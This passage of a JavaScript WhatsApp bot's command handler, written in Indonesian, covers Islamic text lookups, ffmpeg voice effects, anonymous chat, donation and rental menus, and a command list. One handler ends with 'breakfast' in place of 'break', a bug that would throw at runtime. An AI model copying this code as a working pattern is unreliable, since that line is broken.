			headerType: 4
		    }
		    hisoka.sendMessage(m.chat, buttonMessage, { quoted: m })
		} else if (anu.type == 'image') {
		    anu.media.map(async (url) => {
		        hisoka.sendMessage(m.chat, { image: { url }, caption: `⭔ Title : ${anu.title}\n⭔ Author : ${anu.author.name}\n⭔ Like : ${anu.like}\n⭔ Caption : ${anu.caption}` }, { quoted: m })
		    })
		}
	    }
	    break
        case 'ringtone': {
		if (!text) throw `Example : ${prefix + command} black rover`
        let { ringtone } = require('./lib/scraper')
		let anu = await ringtone(text)
		let result = anu[Math.floor(Math.random() * anu.length)]
		hisoka.sendMessage(m.chat, { audio: { url: result.audio }, fileName: result.title+'.mp3', mimetype: 'audio/mpeg' }, { quoted: m })
	    }
	    break
		case 'iqra': {
		oh = `Example : ${prefix + command} 3\n\nIQRA Yang tersedia : 1,2,3,4,5,6`
		if (!text) throw oh
		yy = await getBuffer(`https://islamic-api-indonesia.herokuapp.com/api/data/pdf/iqra${text}`)
		hisoka.sendMessage(m.chat, {document: yy, mimetype: 'application/pdf', fileName: `iqra${text}.pdf`}, {quoted:m}).catch ((err) => m.reply(oh))
		}
		break
		case 'juzamma': {
		if (args[0] === 'pdf') {
		m.reply(mess.wait)
		hisoka.sendMessage(m.chat, {document: {url: 'https://fatiharridho.my.id/database/islam/juz-amma-arab-latin-indonesia.pdf'}, mimetype: 'application/pdf', fileName: 'juz-amma-arab-latin-indonesia.pdf'}, {quoted:m})
		} else if (args[0] === 'docx') {
		m.reply(mess.wait)
		hisoka.sendMessage(m.chat, {document: {url: 'https://fatiharridho.my.id/database/islam/juz-amma-arab-latin-indonesia.docx'}, mimetype: 'application/vnd.openxmlformats-officedocument.wordprocessingml.document', fileName: 'juz-amma-arab-latin-indonesia.docx'}, {quoted:m})
		} else if (args[0] === 'pptx') {
		m.reply(mess.wait)
		hisoka.sendMessage(m.chat, {document: {url: 'https://fatiharridho.my.id/database/islam/juz-amma-arab-latin-indonesia.pptx'}, mimetype: 'application/vnd.openxmlformats-officedocument.presentationml.presentation', fileName: 'juz-amma-arab-latin-indonesia.pptx'}, {quoted:m})
		} else if (args[0] === 'xlsx') {
		m.reply(mess.wait)
		hisoka.sendMessage(m.chat, {document: {url: 'https://fatiharridho.my.id/database/islam/juz-amma-arab-latin-indonesia.xlsx'}, mimetype: 'application/vnd.openxmlformats-officedocument.spreadsheetml.sheet', fileName: 'juz-amma-arab-latin-indonesia.xlsx'}, {quoted:m})
		} else {
		m.reply(`Mau format apa ? Example : ${prefix + command} pdf

Format yang tersedia : pdf, docx, pptx, xlsx`)
		}
		}
		break
		case 'hadis': case 'hadist': {
		if (!args[0]) throw `Contoh:
${prefix + command} bukhari 1
${prefix + command} abu-daud 1

Pilihan tersedia:
abu-daud
1 - 4590
ahmad
1 - 26363
bukhari
1 - 7008
darimi
1 - 3367
ibu-majah
1 - 4331
nasai
1 - 5662
malik
1 - 1594
muslim
1 - 5362`
		if (!args[1]) throw `Hadis yang ke berapa?\n\ncontoh:\n${prefix + command} muslim 1`
		try {
		let res = await fetchJson(`https://islamic-api-indonesia.herokuapp.com/api/data/json/hadith/${args[0]}`)
		let { number, arab, id } = res.find(v => v.number == args[1])
		m.reply(`No. ${number}

${arab}

${id}`)
		} catch (e) {
		m.reply(`Hadis tidak ditemukan !`)
		}
		}
		break
		case 'alquran': {
		if (!args[0]) throw `Contoh penggunaan:\n${prefix + command} 1 2\n\nmaka hasilnya adalah surah Al-Fatihah ayat 2 beserta audionya, dan ayatnya 1 aja`
		if (!args[1]) throw `Contoh penggunaan:\n${prefix + command} 1 2\n\nmaka hasilnya adalah surah Al-Fatihah ayat 2 beserta audionya, dan ayatnya 1 aja`
		let res = await fetchJson(`https://islamic-api-indonesia.herokuapp.com/api/data/quran?surah=${args[0]}&ayat=${args[1]}`)
		let txt = `*Arab* : ${res.result.data.text.arab}
*English* : ${res.result.data.translation.en}
*Indonesia* : ${res.result.data.translation.id}

( Q.S ${res.result.data.surah.name.transliteration.id} : ${res.result.data.number.inSurah} )`
		m.reply(txt)
		hisoka.sendMessage(m.chat, {audio: { url: res.result.data.audio.primary }, mimetype: 'audio/mpeg'}, { quoted : m })
		}
		break
		case 'tafsirsurah': {
		if (!args[0]) throw `Contoh penggunaan:\n${prefix + command} 1 2\n\nmaka hasilnya adalah tafsir surah Al-Fatihah ayat 2`
		if (!args[1]) throw `Contoh penggunaan:\n${prefix + command} 1 2\n\nmaka hasilnya adalah tafsir surah Al-Fatihah ayat 2`
		let res = await fetchJson(`https://islamic-api-indonesia.herokuapp.com/api/data/quran?surah=${args[0]}&ayat=${args[1]}`)
		let txt = `「 *Tafsir Surah*  」

*Pendek* : ${res.result.data.tafsir.id.short}

*Panjang* : ${res.result.data.tafsir.id.long}

( Q.S ${res.result.data.surah.name.transliteration.id} : ${res.result.data.number.inSurah} )`
		m.reply(txt)
		}
		break
		   case 'bass': case 'blown': case 'deep': case 'earrape': case 'fast': case 'fat': case 'nightcore': case 'reverse': case 'robot': case 'slow': case 'smooth': case 'tupai':
                try {
                let set
                if (/bass/.test(command)) set = '-af equalizer=f=54:width_type=o:width=2:g=20'
                if (/blown/.test(command)) set = '-af acrusher=.1:1:64:0:log'
                if (/deep/.test(command)) set = '-af atempo=4/4,asetrate=44500*2/3'
                if (/earrape/.test(command)) set = '-af volume=12'
                if (/fast/.test(command)) set = '-filter:a "atempo=1.63,asetrate=44100"'
                if (/fat/.test(command)) set = '-filter:a "atempo=1.6,asetrate=22100"'
                if (/nightcore/.test(command)) set = '-filter:a atempo=1.06,asetrate=44100*1.25'
                if (/reverse/.test(command)) set = '-filter_complex "areverse"'
                if (/robot/.test(command)) set = '-filter_complex "afftfilt=real=\'hypot(re,im)*sin(0)\':imag=\'hypot(re,im)*cos(0)\':win_size=512:overlap=0.75"'
                if (/slow/.test(command)) set = '-filter:a "atempo=0.7,asetrate=44100"'
                if (/smooth/.test(command)) set = '-filter:v "minterpolate=\'mi_mode=mci:mc_mode=aobmc:vsbmc=1:fps=120\'"'
                if (/tupai/.test(command)) set = '-filter:a "atempo=0.5,asetrate=65100"'
                if (/audio/.test(mime)) {
                m.reply(mess.wait)
                let media = await hisoka.downloadAndSaveMediaMessage(quoted)
                let ran = getRandom('.mp3')
                exec(`ffmpeg -i ${media} ${set} ${ran}`, (err, stderr, stdout) => {
                fs.unlinkSync(media)
                if (err) return m.reply(err)
                let buff = fs.readFileSync(ran)
                hisoka.sendMessage(m.chat, { audio: buff, mimetype: 'audio/mpeg' }, { quoted : m })
                fs.unlinkSync(ran)
                })
                } else m.reply(`Balas audio yang ingin diubah dengan caption *${prefix + command}*`)
                } catch (e) {
                m.reply(e)
                }
                break
            case 'setcmd': {
                if (!m.quoted) throw 'Reply Pesan!'
                if (!m.quoted.fileSha256) throw 'SHA256 Hash Missing'
                if (!text) throw `Untuk Command Apa?`
                let hash = m.quoted.fileSha256.toString('base64')
                if (global.db.data.sticker[hash] && global.db.data.sticker[hash].locked) throw 'You have no permission to change this sticker command'
                global.db.data.sticker[hash] = {
                    text,
                    mentionedJid: m.mentionedJid,
                    creator: m.sender,
                    at: + new Date,
                    locked: false,
                }
                m.reply(`Done!`)
            }
            break
            case 'delcmd': {
                let hash = m.quoted.fileSha256.toString('base64')
                if (!hash) throw `Tidak ada hash`
                if (global.db.data.sticker[hash] && global.db.data.sticker[hash].locked) throw 'You have no permission to delete this sticker command'              
                delete global.db.data.sticker[hash]
                m.reply(`Done!`)
            }
            break
            case 'listcmd': {
                let teks = `
*List Hash*
Info: *bold* hash is Locked
${Object.entries(global.db.data.sticker).map(([key, value], index) => `${index + 1}. ${value.locked ? `*${key}*` : key} : ${value.text}`).join('\n')}
`.trim()
                hisoka.sendText(m.chat, teks, m, { mentions: Object.values(global.db.data.sticker).map(x => x.mentionedJid).reduce((a,b) => [...a, ...b], []) })
            }
            break
            case 'lockcmd': {
                if (!isCreator) throw mess.owner
                if (!m.quoted) throw 'Reply Pesan!'
                if (!m.quoted.fileSha256) throw 'SHA256 Hash Missing'
                let hash = m.quoted.fileSha256.toString('base64')
                if (!(hash in global.db.data.sticker)) throw 'Hash not found in database'
                global.db.data.sticker[hash].locked = !/^un/i.test(command)
                m.reply('Done!')
            }
            break
            case 'addmsg': {
                if (!m.quoted) throw 'Reply Message Yang Ingin Disave Di Database'
                if (!text) throw `Example : ${prefix + command} nama file`
                let msgs = global.db.data.database
                if (text.toLowerCase() in msgs) throw `'${text}' telah terdaftar di list pesan`
                msgs[text.toLowerCase()] = quoted.fakeObj
m.reply(`Berhasil menambahkan pesan di list pesan sebagai '${text}'
    
Akses dengan ${prefix}getmsg ${text}

Lihat list Pesan Dengan ${prefix}listmsg`)
            }
            break
            case 'getmsg': {
                if (!text) throw `Example : ${prefix + command} file name\n\nLihat list pesan dengan ${prefix}listmsg`
                let msgs = global.db.data.database
                if (!(text.toLowerCase() in msgs)) throw `'${text}' tidak terdaftar di list pesan`
                hisoka.copyNForward(m.chat, msgs[text.toLowerCase()], true)
            }
            break
            case 'listmsg': {
                let msgs = JSON.parse(fs.readFileSync('./src/database.json'))
	        let seplit = Object.entries(global.db.data.database).map(([nama, isi]) => { return { nama, ...isi } })
		let teks = '「 LIST DATABASE 」\n\n'
		for (let i of seplit) {
		    teks += `⬡ *Name :* ${i.nama}\n⬡ *Type :* ${getContentType(i.message).replace(/Message/i, '')}\n────────────────────────\n\n`
	        }
	        m.reply(teks)
	    }
	    break
            case 'delmsg': case 'deletemsg': {
	        let msgs = global.db.data.database
	        if (!(text.toLowerCase() in msgs)) return m.reply(`'${text}' tidak terdaftar didalam list pesan`)
		delete msgs[text.toLowerCase()]
		m.reply(`Berhasil menghapus '${text}' dari list pesan`)
            }
	    break
	    case 'anonymous': {
                if (m.isGroup) return m.reply('Fitur Tidak Dapat Digunakan Untuk Group!')
				this.anonymous = this.anonymous ? this.anonymous : {}
				let buttons = [
                    { buttonId: 'start', buttonText: { displayText: 'START' }, type: 1 }
                ]
                hisoka.sendButtonText(m.chat, buttons, `\`\`\`Hi ${await hisoka.getName(m.sender)} Welcome To Anonymous Chat\n\nKlik Button Dibawah Ini Untuk Mencari Partner\`\`\``, 'NelzBotz', m)
            }
			break
            case 'keluar': case 'leave': {
                if (m.isGroup) return m.reply('Fitur Tidak Dapat Digunakan Untuk Group!')
                this.anonymous = this.anonymous ? this.anonymous : {}
                let room = Object.values(this.anonymous).find(room => room.check(m.sender))
                if (!room) {
                    let buttons = [
                        { buttonId: 'start', buttonText: { displayText: 'START' }, type: 1 }
                    ]
                    await hisoka.sendButtonText(m.chat, buttons, `\`\`\`Kamu Sedang Tidak Berada Di Sesi Anonymous, Tekan Button Untuk Mencari Partner \`\`\``)
                    throw false
                }
                m.reply('Ok')
                let other = room.other(m.sender)
                if (other) await hisoka.sendText(other, `\`\`\`Partner Telah Meninggalkan Sesi Anonymous\`\`\``, m)
                delete this.anonymous[room.id]
                if (command === 'leave') break
            }
            case 'mulai': case 'start': {
                if (m.isGroup) return m.reply('Fitur Tidak Dapat Digunakan Untuk Group!')
                this.anonymous = this.anonymous ? this.anonymous : {}
                if (Object.values(this.anonymous).find(room => room.check(m.sender))) {
                    let buttons = [
                        { buttonId: 'keluar', buttonText: { displayText: 'STOP' }, type: 1 }
                    ]
                    await hisoka.sendButtonText(m.chat, buttons, `\`\`\`Kamu Masih Berada Di dalam Sesi Anonymous, Tekan Button Dibawah Ini Untuk Menghentikan Sesi Anonymous Anda\`\`\``, 'NelzBotz', m)
                    throw false
                }
                let room = Object.values(this.anonymous).find(room => room.state === 'WAITING' && !room.check(m.sender))
                if (room) {
                    let buttons = [
                        { buttonId: 'next', buttonText: { displayText: 'SKIP' }, type: 1 },
                        { buttonId: 'keluar', buttonText: { displayText: 'STOP' }, type: 1 }
                    ]
                    await hisoka.sendButtonText(room.a, buttons, `\`\`\`Berhasil Menemukan Partner, sekarang kamu dapat mengirim pesan\`\`\``, 'NelzBotz', m)
                    room.b = m.sender
                    room.state = 'CHATTING'
                    await hisoka.sendButtonText(room.b, buttons, `\`\`\`Berhasil Menemukan Partner, sekarang kamu dapat mengirim pesan\`\`\``, 'NelzBotz', m)
                } else {
                    let id = + new Date
                    this.anonymous[id] = {
                        id,
                        a: m.sender,
                        b: '',
                        state: 'WAITING',
                        check: function (who = '') {
                            return [this.a, this.b].includes(who)
                        },
                        other: function (who = '') {
                            return who === this.a ? this.b : who === this.b ? this.a : ''
                        },
                    }
                    let buttons = [
                        { buttonId: 'keluar', buttonText: { displayText: 'STOP' }, type: 1 }
                    ]
                    await hisoka.sendButtonText(m.chat, buttons, `\`\`\`Mohon Tunggu Sedang Mencari Partner\`\`\``, 'NelzBotz', m)
                }
                break
            }
            case 'next': case 'lanjut': {
                if (m.isGroup) return m.reply('Fitur Tidak Dapat Digunakan Untuk Group!')
                this.anonymous = this.anonymous ? this.anonymous : {}
                let romeo = Object.values(this.anonymous).find(room => room.check(m.sender))
                if (!romeo) {
                    let buttons = [
                        { buttonId: 'start', buttonText: { displayText: 'START' }, type: 1 }
                    ]
                    await hisoka.sendButtonText(m.chat, buttons, `\`\`\`Kamu Sedang Tidak Berada Di Sesi Anonymous, Tekan Button Untuk Mencari Partner\`\`\``)
                    throw false
                }
                let other = romeo.other(m.sender)
                if (other) await hisoka.sendText(other, `\`\`\`Partner Telah Meninggalkan Sesi Anonymous\`\`\``, m)
                delete this.anonymous[romeo.id]
                let room = Object.values(this.anonymous).find(room => room.state === 'WAITING' && !room.check(m.sender))
                if (room) {
                    let buttons = [
                        { buttonId: 'next', buttonText: { displayText: 'SKIP' }, type: 1 },
                        { buttonId: 'keluar', buttonText: { displayText: 'STOP' }, type: 1 }
                    ]
                    await hisoka.sendButtonText(room.a, buttons, `\`\`\`Berhasil Menemukan Partner, sekarang kamu dapat mengirim pesan\`\`\``, 'NelzBotz', m)
                    room.b = m.sender
                    room.state = 'CHATTING'
                    await hisoka.sendButtonText(room.b, buttons, `\`\`\`Berhasil Menemukan Partner, sekarang kamu dapat mengirim pesan\`\`\``, 'NelzBotz', m)
                } else {
                    let id = + new Date
                    this.anonymous[id] = {
                        id,
                        a: m.sender,
                        b: '',
                        state: 'WAITING',
                        check: function (who = '') {
                            return [this.a, this.b].includes(who)
                        },
                        other: function (who = '') {
                            return who === this.a ? this.b : who === this.b ? this.a : ''
                        },
                    }
                    let buttons = [
                        { buttonId: 'keluar', buttonText: { displayText: 'STOP' }, type: 1 }
                    ]
                    await hisoka.sendButtonText(m.chat, buttons, `\`\`\`Mohon Tunggu Sedang Mencari Partner\`\`\``, 'NelzBotz', m)
                }
                break
            }
            case 'public': {
                if (!isCreator) throw mess.owner
                hisoka.public = true
                m.reply('Sukse Change To Public Usage')
            }
            break
            case 'self': {
                if (!isCreator) throw mess.owner
                hisoka.public = false
                m.reply('Sukses Change To Self Usage')
            }
            break
            case 'ping': case 'botstatus': case 'statusbot': {
                const used = process.memoryUsage()
                const cpus = os.cpus().map(cpu => {
                    cpu.total = Object.keys(cpu.times).reduce((last, type) => last + cpu.times[type], 0)
			        return cpu
                })
                const cpu = cpus.reduce((last, cpu, _, { length }) => {
                    last.total += cpu.total
                    last.speed += cpu.speed / length
                    last.times.user += cpu.times.user
                    last.times.nice += cpu.times.nice
                    last.times.sys += cpu.times.sys
                    last.times.idle += cpu.times.idle
                    last.times.irq += cpu.times.irq
                    return last
                }, {
                    speed: 0,
                    total: 0,
                    times: {
			            user: 0,
			            nice: 0,
			            sys: 0,
			            idle: 0,
			            irq: 0
                }
                })
                let timestamp = speed()
                let latensi = speed() - timestamp
                neww = performance.now()
                oldd = performance.now()
                respon = `
Kecepatan Respon ${latensi.toFixed(4)} _Second_ \n ${oldd - neww} _miliseconds_\n\nRuntime : ${runtime(process.uptime())}

💻 Info Server
RAM: ${formatp(os.totalmem() - os.freemem())} / ${formatp(os.totalmem())}

_NodeJS Memory Usaage_
${Object.keys(used).map((key, _, arr) => `${key.padEnd(Math.max(...arr.map(v=>v.length)),' ')}: ${formatp(used[key])}`).join('\n')}

${cpus[0] ? `_Total CPU Usage_
${cpus[0].model.trim()} (${cpu.speed} MHZ)\n${Object.keys(cpu.times).map(type => `- *${(type + '*').padEnd(6)}: ${(100 * cpu.times[type] / cpu.total).toFixed(2)}%`).join('\n')}
_CPU Core(s) Usage (${cpus.length} Core CPU)_
${cpus.map((cpu, i) => `${i + 1}. ${cpu.model.trim()} (${cpu.speed} MHZ)\n${Object.keys(cpu.times).map(type => `- *${(type + '*').padEnd(6)}: ${(100 * cpu.times[type] / cpu.total).toFixed(2)}%`).join('\n')}`).join('\n\n')}` : ''}
                `.trim()
                m.reply(respon)
            }
            break
case  'runtime': {
	m.reply(`Bot Telah On Selama : ${runtime(process.uptime())}`)
	}
	break
case 'bot': {
	m.reply(`Apa?`)
	}
	break
case 'hai': {
	m.reply(`Hai Kak👋`)
	}
	break
case 'assalamualaikum': {
	m.reply(`Waalaikumsalam`)
	}
	break
case 'donasi': case 'donate': {
                hisoka.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/5a1a2e916c53af83c4e4a.jpg' }, caption: `Silahkan Scan Kode QR Diatas Untuk Donasi` }, { quoted: m })
            }
            break
case 'gopay': {
                hisoka.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/ad5f4b7a1d785c88f7406.jpg' }, caption: `GOPAY` }, { quoted: m })
            }
            break
case 'dana': {
                hisoka.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/bf5d06743d5ff119d970a.jpg' }, caption: `DANA` }, { quoted: m })
            }
            break
case 'qris': {
                hisoka.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/5a1a2e916c53af83c4e4a.jpg' }, caption: `QRIS ALL PAYMENT` }, { quoted: m })
            }
            break
case 'api': case 'apikey': {
	m.reply(`Apikey Yang Digunakan Oleh Bot\n\⬣ https://zenzapis.xyz\n⬣ https://api.lolhuman.xyz\n⬣ https://api.caliph71.xyz\n⬣ https://hardianto.xyz\n⬣ https://api.zacros.my.id`)
	}
	breakfast
            case 'rules':  {
            	anu = `*RULES📚*
1. Tolong Gunakan Delay 5 Detik Untuk Menggunakan Bot
2. Gunakan Dengan Bijak
3. Jangan Menelpon Bot
4. Jangan Spam Bot

*PERHATIAN❗*
1. Data WhatsApp Anda Akan Kami Simpan Di Server Kami Selama Bot Aktif
2. Data Anda Akan Dihapus Ketika Bot Offline
3. Kami Tidak Menyimpan Gambar, Video, File, Audio, Dan Dokumen Yang Anda Kirim
4. Kami Tidak Akan Pernah Meminta Anda Untuk Memberikan Informasi Pribadi
5. Jika Anda Melanggar Peraturan Maka Anda Tidak Akan Bisa Mengakses Bot Lagi Dan Bot Akan Memblokir Nomor Anda Secara Permanen
6. Jika Menemukan Bug/Error Silahkan Langsung Lapor Ke Owner Bot!`
let btn = [{
                                quickReplyButton: {
                                    displayText: 'SEWABOT',
                                    id: 'sewabot'
                                }
                                },{
                                	quickReplyButton: {
                                    displayText: 'DONASI💰',
                                    id: 'donasi'
                                }
                            }]
                hisoka.send5ButImg(m.chat, anu, 'AfaBotz', global.thumb, btn)
            }
            break
case 'sewabot': {
	anu = `╭──「 *_SEWA BOT BY AfaBotzZ_* 」
│❏ ➪ _1 MINGGU : 1K_
│❏ ➪ _1 BULAN : 5K_
│❏ ➪ _PERMANEN : 10k_
╰────
╭─ [ *KEUNTUNGAN SEWA BOT* ]
│❏ ➪ _FAST RESPON_
│❏ ➪ _ANTI DELAY_
│❏ ➪ _BOT ON 24JAM_
│❏ ➪ _ANTILINK ( AUTO KICK YANG KIRIM LINK )_
│❏ ➪ _WELCOME IMAGE_
╰──── 
╭─[ *MINAT CHAT📌*]
│❏ ➪ 🪀 _wa.me/6285872380901?text=SEWA+BOT_
╰────
╭─[ *PAYMENT💰*]
│❏ ➪ _GOPAY_
│❏ ➪ _DANA_
│❏ ➪ _QRIS ALL PAYMENT_
╰────`
              let btn = [{
                                quickReplyButton: {
                                    displayText: 'GOPAY',
                                    id: 'gopay'
                                }  
                            }, {
                                quickReplyButton: {
                                    displayText: 'DANA',
                                    id: 'dana'
                                }
                                }, {
                                	quickReplyButton: {
                                    displayText: 'QRIS ALL PAYMENT',
                                    id: 'qris'
                                    }
                            }]
                        hisoka.send5ButImg(m.chat, anu, 'Tekan Tombol Dibawah Untuk Memunculkan Kode QR', global.thumb, btn)
                     }
            break
  case 'menu': {
	anu = `Hai Kak ${pushname}\n\nSaya Adalah AfaBotz, Bot Ini Memakai Program Multi Device Beta Dari WhatsApp.\n\nJadi Jika Kamu Menemukan Bug Atau Kesalahan Silahkan Laporkan Kepada Owner Agar Segera Di Perbaiki.\n\nTerima Kasih🙏`
              let btn = [{
                                urlButton: {
                                    displayText: 'YT CREATOR📽️',
                                    url: 'https://youtube.com/'
                                }
                            }, {
                                quickReplyButton: {
                                    displayText: 'RULES❗',
                                    id: 'rules'
                                }
                            }, {
                                quickReplyButton: {
                                    displayText: 'OWNER👤',
                                    id: 'owner'
                                }  
                            }, {
                                quickReplyButton: {
                                    displayText: 'LIST MENU📚',
                                    id: 'command'
                                }
                            }]
                        hisoka.send5ButImg(m.chat, anu, '© AfaBotz', global.thumb, btn)
                     }
            break
            case 'command':{
let template = await generateWAMessageFromContent(m.chat, proto.Message.fromObject({
                listMessage :{
                    title: `Hi ${pushname}\n┌──⭓ 「 INFO USER 」⭓\n│\n│ Nama : ${pushname}\n│ Nomor : ${m.sender.split('@')[0]}\n│ Status : ${isCreator ? 'Owner' : 'User'}\n│\n└───────⭓\n\n┌──⭓ 「 INFO BOT 」⭓\n│\n│ Prefix : ( ${prefix} )\n│ Nama : ${global.namabot}\n│ Owner : ${global.namaowner}\n│ Mode : ${hisoka.public ? 'Public' : 'Self'}\n│ Runtime : ${runtime(process.uptime())}\n│ Lib : Baileys Multi Device\n│\n└───────⭓`,
                    description: "\n",
                    buttonText: "KLIK DISINI👋",
                    footerText: "Silahkan Klik Tombol Dibawah Ini Untuk Menampilkan Menu",
                    listType: "SINGLE_SELECT",
                    sections: [{
								"title": "All Menu Bot",
								"rows": [
									{
										"title": "All Menu",
										"description": "",
										"rowId": `${prefix}allmenu`
									}
								]
							},
							{
								"title": "List Menu Bot",
								"rows": [
									{
										"title": "Group Menu",
										"description": "",
										"rowId": `${prefix}groupmenu`
									},
									{
										"title": "Download Menu",
										"description": "",
										"rowId": `${prefix}downloadmenu`
									},
										{
										"title": "Search Menu",
										"description": "",
										"rowId": `${prefix}searchmenu`
									},
									{
										"title": "Meme Menu",
										"description": "",
										"rowId": `${prefix}mememenu`
										},
										{
											"title": "Random Menu",
										"description": "",
										"rowId": `${prefix}randommenu`
										},
											{
											"title": "Text Pro Menu",
										"description": "",
										"rowId": `${prefix}textpromenu`
										},
										{
											"title": "Photo Oxy Menu",
										"description": "",
										"rowId": `${prefix}photooxymenu`
										},
										{
											"title": "Ephoto Menu",
										"description": "",
										"rowId": `${prefix}ephotomenu`
										},
										{
											"title": "Fun Menu",
										"description": "",
										"rowId": `${prefix}funmenu`
										},
										{
											"title": "Primbon Menu",
										"description": "",
										"rowId": `${prefix}primbonmenu`
										},
										{
											"title": "Convert Menu",
										"description": "",
										"rowId": `${prefix}convertmenu`
										},
										{
											"title": "Main Menu",
										"description": "",
										"rowId": `${prefix}mainmenu`
										},
										{
											"title": "Database Menu",
										"description": "",
										"rowId": `${prefix}databasemenu`
										},
										{
											"title": "Anonymous Menu",
										"description": "",
										"rowId": `${prefix}anonymousmenu`
										},
										{
											"title": "Islamic Menu",
										"description": "",
										"rowId": `${prefix}islamicmenu`
										},
										{
											"title": "Voice Changer Menu",
										"description": "",
										"rowId": `${prefix}voicemenu`
										},
										{
											"title": "Owner Menu",
										"description": "",
										"rowId": `${prefix}ownermenu`
										}
										]
										},
							{
								"title": "Open Jasa Sewa Bot",
								"rows": [
									{
										"title": "Sewa Bot",
										"description": "",
										"rowId": `${prefix}sewabot`
									}
								]
							},
							{
								"title": "Info Tentang Owner?",
								"rows": [
									{
										"title": "Chat Owner",
										"description": "",
										"rowId": `${prefix}owner`
									}
								]
							},
							{
								"title": "Thanks To",
								"rows": [
									{
										"title": "Contributor",
										"description": "",
										"rowId": `${prefix}thanksto`
									}
								]
							}
						],
          listType: 1
                }
            }), { userJid: m.chat, quoted: m })
            hisoka.relayMessage(m.chat, template.message, { messageId: template.key.id })
            }
            break
            case 'speedtest': {
            m.reply('Testing Speed...')
            let cp = require('child_process')
            let { promisify } = require('util')
            let exec = promisify(cp.exec).bind(cp)
          let o
          try {
          o = await exec('python speed.py')
          } catch (e) {
          o = e
         } finally {
        let { stdout, stderr } = o
        if (stdout.trim()) m.reply(stdout)
        if (stderr.trim()) m.reply(stderr)
            }
            }
            break
            case 'owner': case 'creator': {
                hisoka.sendContact(m.chat, global.owner, m)
            }
            break

case 'allmenu': {
                anu = `Hai Kak ${pushname}
                
┌──⭓ 「 INFO BOT 」⭓
│
│ Prefix : ( ${prefix} )
│ Name : ${global.namabot}\n│ Owner : ${global.namaowner}
│ Mode : ${hisoka.public ? 'Public' : 'Self'}
│ Runtime : ${runtime(process.uptime())}
│ Lib : Baileys Multi Device
│
└───────⭓

┌──⭓ *GROUP MENU*
│
│⭔ ${prefix}linkgroup
│⭔ ${prefix}ephemeral [option]
│⭔ ${prefix}setppgc [image]
│⭔ ${prefix}setname [text]
│⭔ ${prefix}setdesc [text]
│⭔ ${prefix}group [option]
│⭔ ${prefix}editinfo [option]
│⭔ ${prefix}add @user
│⭔ ${prefix}kick @user
│⭔ ${prefix}hidetag [text]
│⭔ ${prefix}tagall [text]
│⭔ ${prefix}antilink [on/off]
│⭔ ${prefix}mute [on/off]
│⭔ ${prefix}promote @user
│⭔ ${prefix}demote @user
│⭔ ${prefix}vote [text]
│⭔ ${prefix}devote
│⭔ ${prefix}upvote
│⭔ ${prefix}cekvote
│⭔ ${prefix}hapusvote
│
└───────⭓

┌──⭓ *DOWNLOAD MENU*
│
│⭔ ${prefix}tiktoknowm [url]
│⭔ ${prefix}tiktokwm [url]
│⭔ ${prefix}tiktokmp3 [url]
│⭔ ${prefix}instagram [url]
│⭔ ${prefix}twitter [url]
│⭔ ${prefix}twittermp3 [url]
│⭔ ${prefix}facebook [url]
│⭔ ${prefix}pinterestdl [url]
│⭔ ${prefix}ytmp3 [url]
│⭔ ${prefix}ytmp4 [url]
│⭔ ${prefix}getmusic [query]
│⭔ ${prefix}getvideo [query]
│⭔ ${prefix}umma [url]
│⭔ ${prefix}joox [query]
│⭔ ${prefix}soundcloud [url]
│
└───────⭓

┌──⭓ *MEME MENU*
│
│⭔ ${prefix}meme
│⭔ ${prefix}memeindo
│⭔ ${prefix}darkjoke
│⭔ ${prefix}darkmeme
│
└───────⭓

┌──⭓ *SEARCH MENU*
│
│⭔ ${prefix}play [query]
│⭔ ${prefix}yts [query]
│⭔ ${prefix}google [query]
│⭔ ${prefix}gimage [query]
│⭔ ${prefix}pinterest [query]
│⭔ ${prefix}wallpaper [query]
│⭔ ${prefix}wikimedia [query]
│⭔ ${prefix}ytsearch [query]
│⭔ ${prefix}ringtone [query]
│⭔ ${prefix}stalk [option] [query]
│
└───────⭓

┌──⭓ *RANDOM MENU*
│
│⭔ ${prefix}coffe
│⭔ ${prefix}quotesanime
│⭔ ${prefix}motivasi
│⭔ ${prefix}dilanquote
│⭔ ${prefix}bucinquote
│⭔ ${prefix}katasenja
│⭔ ${prefix}puisi
│⭔ ${prefix}couple
│⭔ ${prefix}anime
│⭔ ${prefix}waifu
│⭔ ${prefix}husbu
│⭔ ${prefix}neko
│⭔ ${prefix}shinobu
│⭔ ${prefix}waifus (nsfw)
│⭔ ${prefix}nekos (nsfw)
│⭔ ${prefix}trap (nsfw)
│⭔ ${prefix}blowjob (nsfw)
│
└───────⭓

┌──⭓ *TEXT PRO MENU*
│
│⭔ ${prefix}3dchristmas
│⭔ ${prefix}3ddeepsea
│⭔ ${prefix}americanflag
│⭔ ${prefix}3dscifi
│⭔ ${prefix}3drainbow
│⭔ ${prefix}3dwaterpipe
│⭔ ${prefix}halloweenskeleton
│⭔ ${prefix}sketch
│⭔ ${prefix}bluecircuit
│⭔ ${prefix}space
│⭔ ${prefix}metallic
│⭔ ${prefix}fiction
│⭔ ${prefix}greenhorror
│⭔ ${prefix}transformer
│⭔ ${prefix}berry
│⭔ ${prefix}thunder
│⭔ ${prefix}magma
│⭔ ${prefix}3dcrackedstone
│⭔ ${prefix}3dneonlight
│⭔ ${prefix}impressiveglitch
│⭔ ${prefix}naturalleaves
│⭔ ${prefix}fireworksparkle
│⭔ ${prefix}matrix
│⭔ ${prefix}dropwater
│⭔ ${prefix}harrypotter
│⭔ ${prefix}foggywindow
│⭔ ${prefix}neondevils
│⭔ ${prefix}christmasholiday
│⭔ ${prefix}3dgradient
│⭔ ${prefix}blackpink
│⭔ ${prefix}gluetext
│
└───────⭓

┌──⭓ *PHOTO OXY MENU*
│
│⭔ ${prefix}shadow
│⭔ ${prefix}romantic
│⭔ ${prefix}smoke
│⭔ ${prefix}burnpapper
│⭔ ${prefix}naruto
│⭔ ${prefix}lovemsg
│⭔ ${prefix}grassmsg
│⭔ ${prefix}lovetext
│⭔ ${prefix}coffecup
│⭔ ${prefix}butterfly
│⭔ ${prefix}harrypotter
│⭔ ${prefix}retrolol
│
└───────⭓

┌──⭓ *EPHOTO MENU*
│
│⭔ ${prefix}ffcover
│⭔ ${prefix}crossfire
│⭔ ${prefix}galaxy
│⭔ ${prefix}glass
│⭔ ${prefix}neon
│⭔ ${prefix}beach
│⭔ ${prefix}blackpink
│⭔ ${prefix}igcertificate
│⭔ ${prefix}ytcertificate
│
└───────⭓

┌──⭓ *FUN MENU*
│
│⭔ ${prefix}apakah
